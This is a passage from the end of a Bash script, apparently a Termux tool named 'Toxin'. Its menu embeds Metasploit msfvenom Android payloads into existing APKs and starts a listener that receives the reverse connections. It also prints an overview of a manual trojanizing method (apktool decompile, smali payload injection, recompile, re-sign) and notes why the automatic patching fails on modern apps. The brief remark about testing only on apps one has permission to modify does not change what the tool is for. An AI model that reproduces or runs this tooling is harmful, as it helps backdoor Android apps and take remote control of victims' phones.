    echo ""
    echo "${orange}The payload injection method used by this script ('msfvenom -x') directly patches the APK.${normal}"
    echo "${orange}This method often ${bold}FAILS${orange} with modern Android applications due to:${normal}"
    echo "  - ${bold}Code Obfuscation/Shrinking:${normal} Tools like ProGuard/R8 rename classes/methods, breaking the patch."
    echo "  - ${bold}Anti-Tamper Checks:${normal} Apps verifying their own signature or code integrity."
    echo "  - ${bold}Complex Frameworks:${normal} Apps built with React Native, Flutter, Xamarin, etc."
    echo "  - ${bold}Split APKs / App Bundles:${normal} Apps installed in multiple parts."
    echo ""
    echo "${green}APKs that are ${bold}MORE LIKELY*${green} to work:${normal}"
    echo "  - ${bold}Older applications:${normal} Especially those targeting older Android versions."
    echo "  - ${bold}Simple applications:${normal} Apps with basic functionality, minimal libraries."
    echo "  - ${bold}Debug builds:${normal} If you have access to a non-release version."
    echo "  - ${bold}Apps you developed yourself:${normal} For testing purposes, build a simple 'Hello World' app."
    echo ""
    echo "${orange}*There is ${bold}NO GUARANTEE${orange} any specific APK will work.${normal}"
    echo "${orange}Finding publicly available, simple, older APKs for testing can be difficult and legally questionable.${normal}"
    echo "${orange}It's highly recommended to test on an app you have permission to modify (like one you built).${normal}"
    echo ""
    echo "${aqua}For more reliable results, research manual APK modification:${normal}"
    echo "  1. Decompile the APK: ${bold}apktool d app.apk${normal}"
    echo "  2. Generate raw payload: ${bold}msfvenom -p android/... -f raw -o payload.smali${normal}"
    echo "  3. Inject payload code (smali) into the decompiled source (requires knowledge of smali & Android)."
    echo "  4. Recompile the APK: ${bold}apktool b app -o new_app.apk${normal}"
    echo "  5. Sign the new APK: ${bold}apksigner sign ... new_app.apk${normal}"
    echo ""
    read -rp "Press Enter to return to the main menu..."
}


# Main menu function
function main_menu() {
  while true; do
    clear
    ascii_art
    echo "  ${bold}Select an option:${normal}"
    echo "    [1] Generate Payload (Embed in existing APK)"
    echo "    [2] Start Metasploit Listener"
    echo "    [3] Run Full Setup / Install Dependencies"
    echo "    [4] Check for Toxin Updates"
    echo "    [5] APK Compatibility Info & Manual Method Overview"
    echo "    [q] Quit"
    echo ""
    read -rp "    ${aqua}[?] Select : ${normal}" answer

    case "$answer" in
      1)
        local lhost=$(get_lhost)
        local lport=$(get_lport)
        local orig_apk=$(get_original_apk)
        local mod_apk_name=$(get_output_apk_name)
        generate_payload "$lhost" "$lport" "$orig_apk" "$mod_apk_name"
        read -rp "Press Enter to return to the main menu..."
        ;;
      2)
        local lhost=$(get_lhost)
        local lport=$(get_lport)
        start_listener "$lhost" "$lport"
        read -rp "Press Enter to return to the main menu..."
        ;;
      3)
        run_setup
        ;;
      4)
        update_script
        read -rp "Press Enter to return to the main menu..."
        ;;
      5)
        apk_compatibility_info
        ;;
      q | Q)
        echo ""
        display_info "Exiting Toxin. Goodbye!"
        exit 0
        ;;
      *)
        display_warning "Invalid option selected."
        sleep 1
        ;;
    esac
  done
}

# --- Script Entry Point ---
# Check if running in Termux
if [ -z "$PREFIX" ]; then
    display_error "This script is designed to run within Termux."
    exit 1
fi

# Ensure coreutils is available for tput
if ! command_exists tput; then
    echo "[ERROR] 'tput' command not found. Trying to install 'ncurses-utils'..."
    pkg install ncurses-utils -y || { echo "[ERROR] Failed to install ncurses-utils. Cannot proceed."; exit 1; }
    # Re-source colors if needed, though script restart is safer
fi


# Initial check for storage permission before main menu
check_storage_permission

# Start the main menu
main_menu
